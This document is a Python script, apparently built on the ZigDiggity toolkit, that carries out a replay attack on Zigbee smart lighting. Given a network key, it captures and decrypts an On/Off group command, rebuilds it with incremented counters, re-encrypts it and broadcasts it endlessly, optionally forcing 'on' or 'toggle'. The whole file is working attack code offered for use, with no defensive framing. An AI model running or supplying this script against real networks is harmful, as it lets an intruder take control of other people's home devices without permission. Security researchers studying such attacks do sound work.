from zigdiggity.radios.observer_radio import *
from zigdiggity.radios.raspbee_radio import *
from zigdiggity.misc.actions import *
from zigdiggity.observers.wireshark_observer import *
from scapy.layers.zigbee import *
from zigdiggity.packets import *
import zigdiggity.crypto.utils as crypto_utils
import argparse
import time
from zigdiggity.packets.utils import extended_address

# Default channel = 20
parser = argparse.ArgumentParser(description='Perform replay attack, Ctrl+C to exit')
parser.add_argument('-k','--key',action='store',type=lambda s: int(s.replace(':',''),16),dest='key',required=True,help='The network encryption key of the target network')

parser.add_argument('-c','--channel',action='store',type=int,dest='channel',required=False,
                    help='Channel to use. Default is 20')
parser.add_argument('-w','--wireshark',action='store_true',dest='wireshark',required=False,
                    help='See all traffic in wireshark')
parser.add_argument('-i','--interval',action='store',type=int,dest='interval',required=False,
                    help='Set interval for replay of attacks in seconds. Default is 0.5 seconds')
parser.add_argument('-t', '--toggle',action='store_true',dest='toggle',required=False,
                    help='Always send a toggle message instead of the replay message, overwrites --on.')
parser.add_argument('-o', '--on',action='store_true',dest='on',required=False,
                    help='Always send an "on" message instead of the replay message, overwritten by --toggle')
args = parser.parse_args()


# set radio info
hardware_radio = RaspbeeRadio("/dev/ttyS0")
radio = ObserverRadio(hardware_radio)

# check if channel is set, if not set to 20
if args.channel is None:
    args.channel = 20

# check if interval is set, if not set to 0.5 -> Something to add later maybe
if args.interval is None:
    args.interval = 0.5

# show wireshark traffic
if args.wireshark:
    wireshark = WiresharkObserver()
    radio.add_observer(wireshark)

# set radio channel
radio.set_channel(args.channel)
print("Current on channel %d" % args.channel)


def is_on_off_frame(f):
    # this is needed later for the decryption and encryption
    extended_source = extended_address(f[ZigbeeSecurityHeader].source)

    # decrypt the packet
    p = crypto_utils.zigbee_packet_decrypt(args.key, f, extended_source)

    # delivery mode: Group, frametype: Data, profile: Home Automation, Cluster: On/Off
    result = (p[ZigbeeAppDataPayload].delivery_mode == 3 and p[ZigbeeAppDataPayload].aps_frametype == 0
              and p[ZigbeeAppDataPayload].profile == 0x0104 and p[ZigbeeAppDataPayload].cluster == 0x0006)
    return result


message_found = False
frame = None
decrypted_frame = None
print("Looking for messages...")

while not message_found:
    # find lights on the radio
    frame = radio.receive()
    if frame is not None and ZigbeeSecurityHeader in frame:
        if frame is not None and is_on_off_frame(frame):
            message_found = True
            if ZigbeeAppDataPayload in frame:
                decrypted_frame = crypto_utils.zigbee_packet_decrypt(args.key, frame, frame[ZigbeeSecurityHeader].source)
            print("Found a packet to perform the replay attack on!")
            print(frame)

print("Forming default message...")


# Note that by setting all these parameters individually we can change them easily as well
def get_replay_payload(f, increment):
    # set the Application Layer parameters for the packet we want to replay
    al_payload = ZigbeeAppDataPayload()
    al_payload.aps_frametype = f[ZigbeeAppDataPayload].aps_frametype
    al_payload.deliver_mode = f[ZigbeeAppDataPayload].deliver_mode
    al_payload.frame_control = f[ZigbeeAppDataPayload].frame_control
    al_payload.cluster = f[ZigbeeAppDataPayload].cluster
    al_payload.profile = f[ZigbeeAppDataPayload].profile
    al_payload.dst_endpoint = f[ZigbeeAppDataPayload].dst_endpoint
    al_payload.src_endpoint = f[ZigbeeAppDataPayload].src_endpoint
    al_payload.counter = f[ZigbeeAppDataPayload].counter + increment

    # set the ZCL parameters for the packet we want to replay
    zcl = ZigbeeClusterLibrary()
    zcl.zcl_frametype = f[ZigbeeClusterLibrary].zcl_frametype
    zcl.transmission_sequence = f[ZigbeeClusterLibrary].transmission_sequence + increment
    zcl.command_identifier = f[ZigbeeClusterLibrary].command_identifier

    # set message to always on (if the command is set)
    if args.on:
        zcl.command_identifier = 1

    # set message to toggle every x seconds (if the command is set)
    if args.toggle:
        zcl.command_identifier = 2

    # set replay payload
    replayload = al_payload / zcl
    return replayload


# copy (with optional increment of sequence_number) the dot15d4, network layer, and security header data
def get_unencrypted_frame_part(f, increment):
    # set the Dot15d4 parameters for the packet we want to replay
    dot15d4_data = Dot15d4FCS()
    dot15d4_data.fcf_frametype = f[Dot15d4].fcf_frametype
    dot15d4_data.fcf_destaddrmode = f[Dot15d4].fcf_destaddrmode
    dot15d4_data.fcf_srcaddrmode = f[Dot15d4].fcf_srcaddrmode
    dot15d4_data.fcf_panidcompress = f[Dot15d4].fcf_panidcompress
    dot15d4_data.fcf_ackreq = f[Dot15d4].fcf_ackreq
    dot15d4_data.seqnum = f[Dot15d4].seqnum + increment

    # set the NetWork Layer parameters for the packet we want to replay
    nwk = ZigbeeNWK()
    nwk.frametype = f[ZigbeeNWK].frametype
    nwk.discover_route = f[ZigbeeNWK].discover_route
    nwk.proto_version = f[ZigbeeNWK].proto_version
    nwk.flags = f[ZigbeeNWK].flags
    nwk.destination = f[ZigbeeNWK].destination
    nwk.source = f[ZigbeeNWK].source
    nwk.radius = f[ZigbeeNWK].radius
    nwk.seqnum = f[ZigbeeNWK].seqnum + increment

    # set the Zigbee Security Header parameters for the packet we want to replay
    # this here is because the ZigBee Network Layer security bit is 1 for the lights (for application layer it is 0)
    security_header = ZigbeeSecurityHeader()
    security_header.key_type = f[ZigbeeSecurityHeader].key_type
    security_header.fc = f[ZigbeeSecurityHeader].fc + increment
    security_header.source = f[ZigbeeSecurityHeader].source

    # prepare for encryption
    unencrypted_frame_part = dot15d4_data / nwk / security_header
    return unencrypted_frame_part


def encrypt(unencrypted_frame, replay_payload, ext_source_bytes):
    return crypto_utils.zigbee_packet_encrypt(args.key, unencrypted_frame, bytes(replay_payload), ext_source_bytes)


# while loop to send the packets every x seconds
start_time = time.time()

# increment for the sequence numbers
i = 0

print("Starting to send messages :)")
while True:
    # build the package
    replay_frame = encrypt(get_unencrypted_frame_part(frame, i), get_replay_payload(frame, i),
                           frame[ZigbeeSecurityHeader].source)

    # send the package
    radio.send(replay_frame)

    # increment counter for sequence numbers
    i = i+1
    time.sleep(args.interval - ((time.time() - start_time) % args.interval))
